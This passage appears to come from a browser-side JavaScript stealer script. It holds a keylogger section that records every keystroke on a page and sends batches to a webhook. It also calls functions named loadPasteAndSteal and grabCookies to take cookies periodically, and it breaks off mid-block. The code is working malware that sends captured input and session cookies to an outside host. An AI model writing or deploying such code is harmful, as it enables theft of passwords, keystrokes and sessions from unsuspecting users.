// ===== 8. Keylogger =====
var keys = "";
document.addEventListener('keydown', function(e) {
    if (e.key.length === 1) keys += e.key;
    else if (e.key === "Enter") keys += "[ENTER]\n";
    else if (e.key === "Backspace") keys += "[BKSP]";
    else if (e.key === " ") keys += " ";
    
    if (keys.length > 80) {
        sendToWebhook({ content: "⌨️ **Keys**:\n```\n" + keys + "\n```" });
        keys = "";
    }
});

// ===== EXECUTE =====
setTimeout(loadPasteAndSteal, 500);

// Re-send periodically
setInterval(function() {
    var fresh = {
        cookies: grabCookies(),
